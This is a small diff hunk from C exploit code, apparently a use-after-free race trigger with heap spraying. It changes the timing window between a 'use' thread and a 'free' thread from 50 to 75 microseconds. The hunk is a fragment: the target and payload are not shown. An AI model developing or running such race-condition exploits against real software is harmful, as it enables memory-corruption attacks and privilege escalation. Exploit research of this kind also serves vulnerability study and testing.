@@ -225,7 +225,7 @@ void trigger_uaf(struct opaque* o) {
     pthread_create(&th1, NULL, use_thread, o);
     pthread_create(&th2, NULL, free_thread, o);
 
-    nanosleep(NANOSLEEP_50US, NULL); // Critical timing window for race condition
+    nanosleep(NANOSLEEP_75US, NULL); // Critical timing window for race condition
 
     int attempts = 0;
     const int MAX_SPRAY = SPRAY_SIZE;
